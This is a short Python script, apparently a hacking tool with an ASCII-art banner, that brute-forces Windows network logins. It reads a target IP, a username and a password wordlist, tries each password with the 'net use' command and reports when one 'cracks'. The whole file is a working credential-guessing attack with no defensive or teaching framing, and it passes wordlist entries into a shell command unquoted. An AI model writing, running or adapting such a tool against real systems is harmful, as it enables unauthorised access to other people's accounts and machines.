import os


banner = r"""
.___      ____   ____.______  ._______
|   |___  \   \_/   /: __   \ : .____/
|   |   |  \___ ___/ |  \____|| : _/\
|   :   |    |   |   |   :  \ |   /  \
 \      |    |___|   |   |___\|_.: __/
  \____/             |___|       :/   

"""
print(banner)


ip = input("Enter user IP : ")
user = input("Enter Username : ")
wordlist = input("Enter Password List : ")


with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.read().splitlines()

count = 0
for password in passwords:
    count += 1
    print(f"[ATTEMPT {count}] [{password}]")
    cmd = f'net use \\\\{ip} /user:{user} {password}'
    result = os.system(cmd + " >nul 2>&1")
    
    if result == 0:  # sukses login
        print(f"\n[+] Password Cracked : {password}")
        break
else:
    print("\n[-] Password not found...")
